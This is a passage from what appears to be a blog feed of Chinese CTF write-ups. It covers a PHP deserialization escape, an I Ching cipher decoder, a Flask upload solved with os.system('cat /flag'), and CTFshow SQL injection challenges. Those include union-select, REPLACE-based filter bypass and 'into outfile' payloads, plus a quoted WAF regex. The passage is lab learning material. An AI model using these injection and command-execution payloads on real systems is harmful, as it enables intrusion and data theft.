\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0 </p><p>在write函数在\0的数目成功翻倍，进入read()函数从\0开始到&amp;password=a”;s:8:”password”;进入user类的构造，而O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}则成功逃逸， </p><p>这里还有个__wakeup()将在序列化之后立即被调用， wakeup()函数的漏洞利用……</p><p>将得到的hint串进行解码，得到新一段php代码，直接访问index.CGI</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$hint</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.cgi"</span><span class="token punctuation">;</span> <span class="token comment">// You can't see me~</span><span class="token operator">?</span>php<span class="token operator">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> 从url可以看出get,使用file协议从本地读取flag即可。</p><h3 id="道友不来算一算凶吉？"><a href="#道友不来算一算凶吉？" class="headerlink" title="道友不来算一算凶吉？"></a>道友不来算一算凶吉？</h3><blockquote><p>半仙我夜观天象，掐指一算，卜出卦象如下，不知道的有无道友可解此卦。</p><p>密文:升益艮归妹井萃旅离旅困未济屯未济中孚未济升困噬嗑鼎震巽噬嗑解节井萃离未济蒙归妹大畜无妄解兑临睽升睽未济无妄遁涣归妹</p><p>嗯？为什么还有a和b呢?<br>a=5，b=7</p></blockquote><p>这是一道标着密码学的杂项……八卦通过两两组合一共有64种卦象，在题目附件里有一个python代码，应该是作为加密使用的，我们要做的是根据这个找到解密方式</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">def</span> <span class="token function">encrpyt5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    enc<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        enc<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token operator">+</span><span class="token number">97</span><span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp<span class="token operator">=</span><span class="token string">''</span>    offset<span class="token operator">=</span><span class="token number">5</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temp<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span>offset<span class="token operator">-</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这就基本跟当时那个一样了….还真就是BUJCTF2020那个密码学….</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64s <span class="token operator">=</span> <span class="token string">'升益艮归妹井萃旅离旅困未济屯未济中孚未济升困噬嗑鼎震巽噬嗑解节井萃离未济蒙归妹大畜无妄解兑临睽升睽未济无妄遁涣归妹'</span>dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'坤'</span><span class="token punctuation">:</span> <span class="token string">'000000'</span><span class="token punctuation">,</span> <span class="token string">'剥'</span><span class="token punctuation">:</span> <span class="token string">'000001'</span><span class="token punctuation">,</span> <span class="token string">'比'</span><span class="token punctuation">:</span> <span class="token string">'000010'</span><span class="token punctuation">,</span> <span class="token string">'观'</span><span class="token punctuation">:</span> <span class="token string">'000011'</span><span class="token punctuation">,</span> <span class="token string">'豫'</span><span class="token punctuation">:</span> <span class="token string">'000100'</span><span class="token punctuation">,</span> <span class="token string">'晋'</span><span class="token punctuation">:</span> <span class="token string">'000101'</span><span class="token punctuation">,</span> <span class="token string">'萃'</span><span class="token punctuation">:</span> <span class="token string">'000110'</span><span class="token punctuation">,</span> <span class="token string">'否'</span><span class="token punctuation">:</span> <span class="token string">'000111'</span><span class="token punctuation">,</span> <span class="token string">'谦'</span><span class="token punctuation">:</span> <span class="token string">'001000'</span><span class="token punctuation">,</span> <span class="token string">'艮'</span><span class="token punctuation">:</span> <span class="token string">'001001'</span><span class="token punctuation">,</span> <span class="token string">'蹇'</span><span class="token punctuation">:</span> <span class="token string">'001010'</span><span class="token punctuation">,</span> <span class="token string">'渐'</span><span class="token punctuation">:</span> <span class="token string">'001011'</span><span class="token punctuation">,</span> <span class="token string">'小过'</span><span class="token punctuation">:</span> <span class="token string">'001100'</span><span class="token punctuation">,</span> <span class="token string">'旅'</span><span class="token punctuation">:</span> <span class="token string">'001101'</span><span class="token punctuation">,</span> <span class="token string">'咸'</span><span class="token punctuation">:</span> <span class="token string">'001110'</span><span class="token punctuation">,</span> <span class="token string">'遁'</span><span class="token punctuation">:</span> <span class="token string">'001111'</span><span class="token punctuation">,</span> <span class="token string">'师'</span><span class="token punctuation">:</span> <span class="token string">'010000'</span><span class="token punctuation">,</span> <span class="token string">'蒙'</span><span class="token punctuation">:</span> <span class="token string">'010001'</span><span class="token punctuation">,</span> <span class="token string">'坎'</span><span class="token punctuation">:</span> <span class="token string">'010010'</span><span class="token punctuation">,</span> <span class="token string">'涣'</span><span class="token punctuation">:</span> <span class="token string">'010011'</span><span class="token punctuation">,</span> <span class="token string">'解'</span><span class="token punctuation">:</span> <span class="token string">'010100'</span><span class="token punctuation">,</span> <span class="token string">'未济'</span><span class="token punctuation">:</span> <span class="token string">'010101'</span><span class="token punctuation">,</span> <span class="token string">'困'</span><span class="token punctuation">:</span> <span class="token string">'010110'</span><span class="token punctuation">,</span> <span class="token string">'讼'</span><span class="token punctuation">:</span> <span class="token string">'010111'</span><span class="token punctuation">,</span> <span class="token string">'升'</span><span class="token punctuation">:</span> <span class="token string">'011000'</span><span class="token punctuation">,</span> <span class="token string">'蛊'</span><span class="token punctuation">:</span> <span class="token string">'011001'</span><span class="token punctuation">,</span> <span class="token string">'井'</span><span class="token punctuation">:</span> <span class="token string">'011010'</span><span class="token punctuation">,</span> <span class="token string">'巽'</span><span class="token punctuation">:</span> <span class="token string">'011011'</span><span class="token punctuation">,</span> <span class="token string">'恒'</span><span class="token punctuation">:</span> <span class="token string">'011100'</span><span class="token punctuation">,</span> <span class="token string">'鼎'</span><span class="token punctuation">:</span> <span class="token string">'011101'</span><span class="token punctuation">,</span> <span class="token string">'大过'</span><span class="token punctuation">:</span> <span class="token string">'011110'</span><span class="token punctuation">,</span> <span class="token string">'姤'</span><span class="token punctuation">:</span> <span class="token string">'011111'</span><span class="token punctuation">,</span><span class="token string">'复'</span><span class="token punctuation">:</span> <span class="token string">'100000'</span><span class="token punctuation">,</span> <span class="token string">'颐'</span><span class="token punctuation">:</span> <span class="token string">'100001'</span><span class="token punctuation">,</span> <span class="token string">'屯'</span><span class="token punctuation">:</span> <span class="token string">'100010'</span><span class="token punctuation">,</span> <span class="token string">'益'</span><span class="token punctuation">:</span> <span class="token string">'100011'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">:</span> <span class="token string">'100100'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">:</span> <span class="token string">'100101'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">:</span> <span class="token string">'100110'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">:</span> <span class="token string">'100111'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">:</span> <span class="token string">'101000'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">:</span> <span class="token string">'101001'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">:</span> <span class="token string">'101010'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">:</span> <span class="token string">'101011'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">:</span> <span class="token string">'101100'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">:</span> <span class="token string">'101101'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">:</span> <span class="token string">'101110'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">:</span> <span class="token string">'101111'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">:</span> <span class="token string">'110000'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">:</span> <span class="token string">'110001'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">:</span> <span class="token string">'110010'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">:</span> <span class="token string">'110011'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">:</span> <span class="token string">'110100'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">:</span> <span class="token string">'110101'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">:</span> <span class="token string">'110110'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">:</span> <span class="token string">'110111'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">:</span> <span class="token string">'111000'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">:</span> <span class="token string">'111001'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">:</span> <span class="token string">'111010'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">:</span> <span class="token string">'111011'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">:</span> <span class="token string">'111100'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">:</span> <span class="token string">'111101'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">:</span> <span class="token string">'111110'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">:</span> <span class="token string">'111111'</span><span class="token punctuation">&#125;</span>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>k <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 两个字符的标志位</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        k <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">continue</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dic<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dic<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        k <span class="token operator">=</span> <span class="token number">1</span>ss <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>l<span class="token punctuation">)</span>enc <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    enc <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token operator">+</span>ss<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt4</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">''</span>    offset <span class="token operator">=</span> <span class="token number">5</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span>offset<span class="token operator">-</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt4</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">''</span>    offset <span class="token operator">=</span> <span class="token number">5</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>offset<span class="token operator">+</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>a<span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token keyword">def</span> <span class="token function">encrpyt5</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    enc <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        enc <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token operator">+</span><span class="token number">97</span><span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt5</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    enc <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span> <span class="token operator">-</span> b<span class="token operator">+</span><span class="token number">26</span><span class="token operator">*</span>k<span class="token punctuation">)</span> <span class="token operator">%</span> a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                enc <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span> <span class="token operator">-</span> b <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> k<span class="token punctuation">)</span> <span class="token operator">//</span> a <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>decrypt5<span class="token punctuation">(</span>decrypt4<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>File Upload<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/uploader<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">accept</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>.jpg,.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- Give me the file, and I will return the Running results by python to you! --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用POST传参而且只传jpg或者png文件，而且上传的文件只允许是jpg png格式 且文件只会用python上传 ，构造jpg文件。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到里面存着flag文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> osos<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span>  <span class="token comment">#得到flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bugku </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow之web入门SQL注入</title>
      <link href="/2022/05/06/CTFshow%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/05/06/CTFshow%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><p>使用sqlmap是没有灵魂的，我尽量手注，</p><p>在这一道题我们可以看见一共是24个，同时查询的是ID，我们猜测id实际上不止24个，但直接是无法查询到更多数据，推测是</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">!=</span><span class="token string">'flag'</span> <span class="token operator">and</span> id <span class="token operator">=</span> "<span class="token punctuation">.</span>$_GET<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们可以构造9999’ or id=’26在前一句命令没有执行的情况下，去强行跳转执行，得到flag。</p><h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><blockquote><p>TIP: 撸猫为主，要什么flag? </p></blockquote><p>这道题SQL语句与上一道一样,但是多了限制条件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//检查结果是否有flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!==</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'查询成功'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">9999</span><span class="token string">' union select id,password from ctfshow_user2 where username = '</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><p>真就是花式吊打,上一道题的构造直接可以使用因为flag是出现在username中的，我们可以在使用联合查询的时候直接不去查username，查询两次id，因为两个都是id的话会有问题，定义一个别名就行。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">9999</span><span class="token string">' union select id as '</span><span class="token number">12</span><span class="token string">',id,password from ctfshow_user3 where username = '</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以对username进行编码</p><pre class="line-numbers language-none"><code class="language-none">9999&#39; union select id,hex(username),password from ctfshow_user3 where username &#x3D; &#39;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><p>在返回逻辑中过滤掉了数字</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">0</span><span class="token string">' union select REPLACE(username,'</span>g<span class="token string">','</span>j<span class="token string">'),REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(password,'</span>g<span class="token string">','</span><span class="token number">9</span><span class="token string">'),'</span><span class="token number">0</span><span class="token string">','</span>h<span class="token string">'),'</span><span class="token number">1</span><span class="token string">','</span>i<span class="token string">'),'</span><span class="token number">2</span><span class="token string">','</span>j<span class="token string">'),'</span><span class="token number">3</span><span class="token string">','</span>k<span class="token string">'),'</span><span class="token number">4</span><span class="token string">','</span>l<span class="token string">'),'</span><span class="token number">5</span><span class="token string">','</span>m<span class="token string">'),'</span><span class="token number">6</span><span class="token string">','</span>n<span class="token string">'),'</span><span class="token number">7</span><span class="token string">','</span>o<span class="token string">'),'</span><span class="token number">8</span><span class="token string">','</span>p<span class="token string">'),'</span><span class="token number">9</span><span class="token string">','</span>q<span class="token string">') from ctfshow_user4 where username='</span>flag' <span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到的flag一一替换便可以得到真正的flag</p><h3 id="Web175"><a href="#Web175" class="headerlink" title="Web175"></a>Web175</h3><pre class="line-numbers language-none"><code class="language-none">0&#39; union select 1,password from ctfshow_user5 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h3><p>好吧直接万能注入就行了，看别的博客上说是过滤了select……构造： <strong>1’or 1=1– -</strong> </p><h3 id="Web177"><a href="#Web177" class="headerlink" title="Web177"></a>Web177</h3><p>这一个题目，这个过滤了空格….. 1’and’1’=’1 </p><h3 id="Web178"><a href="#Web178" class="headerlink" title="Web178"></a>Web178</h3><p>似乎是多过滤了什么，又似乎是什么都没有过滤。</p><h3 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//对传入的参数进行了过滤</span>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>给出了后端过滤的内容，过滤了into，select，flag等，这样就不能进行联合注入了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络</title>
      <link href="/2022/04/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>/2022/04/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
